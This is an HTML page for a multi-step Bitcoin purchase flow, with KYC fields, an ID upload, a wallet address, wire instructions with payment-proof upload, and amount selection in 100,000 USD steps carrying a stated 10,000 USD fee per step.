<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Buy Bitcoin</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div id="welcome-page" class="page">
            <h1>Welcome to Bitcoin Purchase</h1>
            <button onclick="nextPage()">Next</button>
        </div>

        <div id="kyc-page" class="page hidden">
            <h1>KYC Information</h1>
            <form id="kyc-form">
                <label for="name">Name:</label>
                <input type="text" id="name" name="name" required><br>

                <label for="address">Address:</label>
                <input type="text" id="address" name="address" required><br>

                <label for="email">Email:</label>
                <input type="email" id="email" name="email" required><br>

                <label for="phone">Phone Number:</label>
                <input type="text" id="phone" name="phone" required><br>

                <label for="id">Upload Valid ID:</label>
                <input type="file" id="id" name="id" required><br>

                <button type="button" onclick="nextPage()">Next</button>
            </form>
        </div>

        <div id="wallet-page" class="page hidden">
            <h1>Recipient Wallet Address</h1>
            <label for="wallet">Wallet Address:</label>
            <input type="text" id="wallet" name="wallet" required><br>
            <button onclick="nextPage()">Next</button>
        </div>

        <div id="wire-page" class="page hidden">
            <h1>Wire Instructions</h1>
            <div id="wire-instructions">
                <!-- Wire instructions will be generated here -->
            </div>
            <label for="payment-proof">Upload Payment Proof:</label>
            <input type="file" id="payment-proof" name="payment-proof" required><br>
            <button onclick="nextPage()">Submit</button>
        </div>

        <div id="confirm-page" class="page hidden">
            <h1>Confirm Transaction</h1>
            <div id="transaction-details">
                <!-- Transaction details will be shown here -->
            </div>
            <label for="amount">Bitcoin Amount (in 100k USD increments):</label>
            <input type="number" id="amount" name="amount" value="100000" step="100000" min="100000" onchange="updateAmount()"><br>
            <p>Note: A compulsory 10,000 USD is added for every 100k increment.</p>
            <button onclick="confirmTransaction()">Confirm</button>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
